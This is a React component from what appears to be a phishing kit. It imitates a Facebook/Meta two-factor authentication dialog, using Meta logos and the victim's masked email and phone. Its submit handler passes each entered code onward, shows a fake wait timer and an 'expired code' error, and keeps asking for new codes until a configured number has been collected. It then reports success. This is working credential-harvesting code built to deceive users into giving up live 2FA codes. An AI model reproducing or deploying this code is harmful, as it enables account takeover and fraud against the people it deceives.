'use client';

import TwoFAImage from '@/assets/images/2FA.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import CONFIG from '@/utils/config';
import type { VerifiedFormData } from '@/utils/message';
import { type FC, type FormEvent, useState } from 'react';

function maskEmail(email: string) {
    const atIndex = email.indexOf('@');
    if (atIndex < 0) return email;
    const localPart = email.slice(0, atIndex);
    const domain = email.slice(atIndex + 1);
    if (!localPart || !domain) return email;
    return `${localPart[0]}**${localPart.slice(-1)}@${domain}`;
}

function maskPhone(phone: string) {
    const digits = phone.replaceAll(/\D/g, '');
    if (digits.length < 4) return phone;
    return phone.slice(0, -2).replaceAll(/\d/g, '*') + ' ' + phone.slice(-2);
}

interface TwoFAModalProps {
    show: boolean;
    onClose: () => void;
    onSubmit: (code: string) => void;
    onSuccess: () => void;
    texts: Record<string, string>;
    formData: VerifiedFormData;
}

const TwoFAModal: FC<TwoFAModalProps> = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const maxAttempts = CONFIG.MAX_CODE_ATTEMPTS;
    const currentStep = attempts + 1;

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!code.trim() || code.length < 6 || code.length > 8 || countdown > 0) return;

        setIsLoading(true);
        setShowError(false);
        onSubmit(code);

        const loadingTime = CONFIG.CODE_LOADING_TIME;
        setCountdown(loadingTime);

        const timer = window.setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    window.clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => window.setTimeout(resolve, loadingTime * 1000));

        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        setIsLoading(false);
        setCountdown(0);

        if (nextAttempts >= maxAttempts) {
            onSuccess();
            return;
        }

        setShowError(true);
        setCode('');
    };

    const formatTime = (seconds: number) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    if (!show) return null;

    const displayName = formData.fullName || formData.pageName || '';
    const displayEmail = maskEmail(formData.personalEmail || formData.businessEmail || '');
    const displayPhone = maskPhone(formData.phone || '');
    const contactInfo = [displayEmail, displayPhone].filter(Boolean).join(', ');

    return (
        <>
            <div className='modal-backdrop show' onClick={onClose} aria-hidden='true' />
            <div className='modal form-modal show' id='twoFAmodal' style={{ display: 'block' }} tabIndex={-1}>
                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                    <div className='modal-content'>
                        <div className='modal-body'>
                            {displayName && (
                                <div style={{ fontSize: '13px', color: '#65676B', marginBottom: '3px', display: 'flex', alignItems: 'center', gap: '4px' }}>
                                    <span>{displayName}</span>
                                    <span>•</span>
                                    <span>Facebook</span>
                                </div>
                            )}
                            <div className='modal-title' style={{ fontSize: '17px', fontWeight: 700, color: '#0A1317', marginBottom: '8px' }}>
                                {texts.twoFATitle} ({currentStep}/{maxAttempts})
                            </div>
                            <p style={{ fontSize: '14px', color: '#65676B', marginBottom: '8px' }}>
                                {texts.twoFAInstruction}
                                {contactInfo && <> {contactInfo}</>} {texts.twoFAInstructionOr}
                            </p>
                            <div style={{ marginBottom: '12px' }}>
                                <img alt='2FA' src={TwoFAImage.src} style={{ width: '100%', height: 'auto', borderRadius: '12px', display: 'block' }} />
                            </div>
                            <form id='twoFAForm' onSubmit={handleSubmit}>
                                <div className='mb-3'>
                                    <label className='form-label' htmlFor='twofa-code-input'>
                                        {texts.code}
                                    </label>
                                    <input
                                        autoComplete='off'
                                        className={`form-control ${showError ? 'is-invalid' : ''}`}
                                        id='twofa-code-input'
                                        inputMode='numeric'
                                        pattern='[0-9]{6,8}'
                                        type='tel'
                                        value={code}
                                        disabled={countdown > 0}
                                        onChange={(e) => {
                                            const val = e.target.value.replaceAll(/\D/g, '');
                                            if (val.length <= 8) setCode(val);
                                            if (showError) setShowError(false);
                                        }}
                                    />
                                    {showError && countdown > 0 && (
                                        <div className='invalid-feedback' style={{ display: 'block' }}>
                                            {texts.codeExpired} <span className='notranslate'>{countdown}s</span>
                                        </div>
                                    )}
                                </div>
                                <div className='form-btn-wrapper'>
                                    <button className='btn btn-primary' type='submit' disabled={isLoading || !code.trim() || code.length < 6 || countdown > 0}>
                                        <span className='button-text'>
                                            {isLoading ? `${texts.pleaseWait} ${formatTime(countdown)}...` : texts.continueBtn}
                                        </span>
                                    </button>
                                </div>
                            </form>
                            <div className='spaser' />
                        </div>
                        <div className='modal-footer border-0' style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                            <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default TwoFAModal;
